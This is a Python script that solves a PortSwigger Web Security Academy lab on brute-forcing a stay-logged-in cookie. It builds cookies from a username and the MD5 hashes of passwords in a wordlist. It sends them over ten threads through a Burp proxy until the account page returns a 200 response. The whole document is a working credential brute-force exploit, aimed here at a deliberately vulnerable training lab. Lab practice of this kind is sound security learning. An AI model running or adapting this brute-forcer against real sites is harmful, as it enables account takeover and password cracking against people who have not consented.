### Portswigger Lab: Brute-forcing a stay-logged-in cookie ###
import requests
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed


def initialize_settings():
    """Initialize and return the global settings."""
    return {
        "base_url": "https://0a3100fa0356bbb681df8e8500e4000a.web-security-academy.net",
        "target_endpoint": "/my-account?id=carlos",
        "target_username": "carlos",
        "burp_proxy": {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        "ca_cert_path": "certs/burp_cacert_chain.pem",
        "session": requests.Session(),
        "session_cookie": None,
    }


def get_cookies(settings):
    """Retrieve cookies automatically from the initial GET request."""
    session = settings["session"]
    url = settings["base_url"]
    ca_cert_path = settings["ca_cert_path"]
    
    print(f"Using CA cert path: {ca_cert_path}")
    try:
        response = session.get(url, verify=ca_cert_path)
        response.raise_for_status()
        print("Initial GET request successful.")
        cookies = session.cookies.get_dict()
        print(f"Retrieved cookies: {cookies}")
        settings["session_cookie"] = cookies.get("session", None)
    except requests.exceptions.SSLError as e:
        print(f"SSL Error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")


def md5_hash(password):
    """Generate an MD5 hash of the password."""
    return hashlib.md5(password.encode()).hexdigest()


def generate_stay_logged_in_cookie(username, password):
    """Generate a Base64-encoded Stay-Logged-In cookie."""
    hashed_password = md5_hash(password)
    cookie_string = f"{username}:{hashed_password}"
    return base64.b64encode(cookie_string.encode()).decode()


def load_password_list():
    try:
        with open("res/passwords.txt", "r") as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print("Password file not found.")
        return []


def test_cookie(settings, password):
    """Test a single password by generating and sending the stay-logged-in cookie."""
    stay_logged_in_cookie = generate_stay_logged_in_cookie(
        settings["target_username"], password
    )
    headers = {
        "Cookie": f"stay-logged-in={stay_logged_in_cookie}; session={settings['session_cookie']}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": f"{settings['base_url']}/login",
    }
    
    try:
        response = settings["session"].get(
            f"{settings['base_url']}{settings['target_endpoint']}",
            headers=headers,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
            allow_redirects=False,
        )
        if response.status_code == 200:  # Successful login
            return password
        elif response.status_code == 302:  # Redirect indicates incorrect password
            print(f"Redirect detected for password: {password}")
        else:
            print(f"Failed attempt with password: {password}, Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request failed for password {password}: {e}")
    return None


def brute_force_stay_logged_in_cookie(settings):
    passwords = load_password_list()
    if not passwords:
        print("No passwords loaded.")
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(test_cookie, settings, password): password
            for password in passwords
        }

        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"Valid password found: {result}")
                executor.shutdown(wait=False, cancel_futures=True)
                return result

    print("No valid Stay-Logged-In cookie found.")
    return None


def main():
    settings = initialize_settings()
    
    print("Retrieving session cookie...")
    get_cookies(settings)
    
    if not settings["session_cookie"]:
        print("Failed to retrieve session cookie. Exiting.")
    else:
        print("Brute-forcing Stay-Logged-In cookie...")
        valid_password = brute_force_stay_logged_in_cookie(settings)

        if valid_password:
            print(f"Success! Valid password is: {valid_password}")
        else:
            print("Failed to brute-force Stay-Logged-In cookie.")


if __name__ == "__main__":
    main()